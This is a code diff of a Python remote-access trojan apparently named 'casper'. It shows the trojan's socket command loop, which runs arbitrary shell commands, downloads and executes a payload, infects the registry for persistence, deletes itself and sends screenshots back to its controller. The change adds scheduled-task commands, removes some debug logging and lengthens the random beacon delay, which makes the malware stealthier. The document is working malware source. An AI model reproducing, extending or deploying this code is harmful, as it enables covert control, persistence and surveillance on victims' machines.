@@ -45,25 +45,22 @@ def socket_control():
 								process_create = os.popen(data.split()[1])
 								process_result = process_create.read()
 								if process_result:
-									logging.debug("[casper] Successfully ran command {}".format(data.split()[1]))
 									socket_server.send(encode(process_result))
 								else:
-									logging.debug("[casper] Error while getting command result")
 									socket_server.send(encode("\nError while getting command result\n"))
 							except Exception as e:
-								logging.debug("[casper] Error while executing command")
 								socket_server.send(encode("\nError while executing command\n"))
 						elif (data.split()[0] == "quit"):
 							socket_server.send(encode("\nExiting/shutting down server\n"))
 							socket_server.close()
 							sys.exit()
-						elif (data.split()[0] == "downexec"):
+						elif (data.split()[0] == "download"):
 							if (download_execute(data.split()[1],"tmp.exe",1) == True):
 								socket_server.send(encode("\nDownload and execute finished\n"))
 							else:
 								socket_server.send(encode("\nError while downloading and execute\n"))						
 						elif (data.split()[0] == "infect"):
-							if (infect() == True):
+							if (infect_registry() == True):
 								socket_server.send(encode("\nRegistry infection finished\n"))
 							else:
 								socket_server.send(encode("\nError during registry infection\n"))
@@ -72,21 +69,42 @@ def socket_control():
 								socket_server.send(encode("\nSuccessfully deleted myself\n"))
 							else:
 								socket_server.send(encode("\nError during deletion of myself\n"))
+						elif (data.split()[0] == "schtasks"):
+							if (data.split()[1] == "create"):
+								if (create_task(data.split()[2],data.split()[3]) == True):
+									socket_server.send(encode("\nSuccessfully created schtask\n"))
+								else:
+									socket_server.send(encode("\Eroror during creation of schtask\n"))
+							else:
+								pass
+							if (data.split()[1] == "run"):
+								if  (run_task(data.split()[2]) == True):
+									socket_server.send(encode("\nSuccessfully ran schtask\n"))
+								else:
+									socket_server.send(encode("\Eroror while running schtask\n"))
+							else:
+								pass									
+							if (data.split()[1] == "delete"):
+								if  (del_task(data.split()[2]) == True):
+									socket_server.send(encode("\nSuccessfully deleted schtask\n"))
+								else:
+									socket_server.send(encode("\Eroror during deletion of schtask\n"))
+							else:
+								pass									
 						elif (data.split()[0] == "screenshot"):
 								try:
 									with mss.mss() as screen:
-										logging.debug("[casper] Getting monitors")
+										logging.debug('[casper] Getting monitors')
 										image = screen.grab(screen.monitors[1-1])
 										
-										logging.debug("[casper] Reading image raw_bytes")
+										logging.debug('[casper] Reading image raw_bytes')
 										raw_bytes = mss.tools.to_png(image.rgb,image.size)
 										
-										logging.debug("[casper] Successfully read image raw_bytes")
+										logging.debug('[casper] Successfully read image raw_bytes')
 										socket_server.send(encode(raw_bytes))
 										socket_server.send(encode("\nSuccessfully received screenshot\n"))	
 								except Exception as e:
 									logging.debug("[casper] Error saving screenshot >> {}".format(e))
-									socket_server.send(encode("\nUnable to take screenshot\n"))
 						else:
 							pass
 				except Exception as e:
@@ -98,7 +116,7 @@ def socket_control():
 			socket_server.close()
 			
 			logging.debug("[casper] Idling a while")
-			time.sleep(random.randint(1,5))
+			time.sleep(random.randint(5,15))
 	else:
 		logging.debug("[casper] Quiting...")
 		sys.exit()
